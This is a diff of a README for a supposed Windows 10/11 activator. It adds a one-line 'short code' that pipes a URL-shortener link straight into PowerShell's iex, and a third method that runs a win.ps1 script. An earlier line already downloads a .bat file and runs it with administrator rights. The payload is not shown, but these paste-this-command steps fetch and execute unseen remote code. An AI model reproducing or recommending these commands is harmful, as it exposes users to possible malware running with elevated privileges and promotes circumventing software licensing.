@@ -26,12 +26,25 @@ COPY AND PASTE THIS:
 irm "https://raw.githubusercontent.com/betamod9/Windows-10-and-11-Activator/main/windows.bat" -OutFile "windows.bat"; Start-Process -FilePath "windows.bat" -Verb RunAs
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
+OR SHORT CODE: 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+irm https://dub.sh/activator | iex
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Method 2: Manual Download
 
 Download or copy the windows.bat file to your system.
 
 Double-click the windows.bat file to run it.
+
+Follow the on-screen instructions to complete the activation.
+
+Enjoy a permanently activated Windows system in no time!
+
+Method 3: Manual Download
+
+Download or copy the win.ps1 file to your system.
+
+Right-click the win.ps1 file and pres Run with PowerShell to run it.
 
 Follow the on-screen instructions to complete the activation.
 
